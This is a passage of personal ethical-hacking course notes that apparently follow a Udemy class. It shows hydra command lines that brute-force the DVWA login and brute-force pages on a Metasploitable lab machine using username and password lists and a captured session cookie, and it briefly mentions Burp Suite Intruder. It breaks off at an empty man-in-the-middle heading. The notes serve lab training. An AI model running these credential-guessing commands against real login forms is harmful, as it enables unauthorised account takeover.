┌──(kali㉿kali)-[~]
└─$ hydra <metasploitable ip>  http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed"  -L usernames.txt -P passwords.txt 
```
- http://<metasploitable ip>/dvwa/vulnerabilities/brute page
  - get cookie with burpsuite
```
┌──(kali㉿kali)-[~]
└─$ hydra <metasploitable ip> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:security=low; PHPSESSID=4............."  -L usernames.txt -P passwords.txt
```

### BruteForce with Burpsuite Intruder
- right click on intercepted request/send to intruder/follow steps

# Section 14 : login BruteForce
- section not followed; however you can find this example code provided by the teacher of ZTM udemy classes in python project folder

# Section 15 : Man in the middle
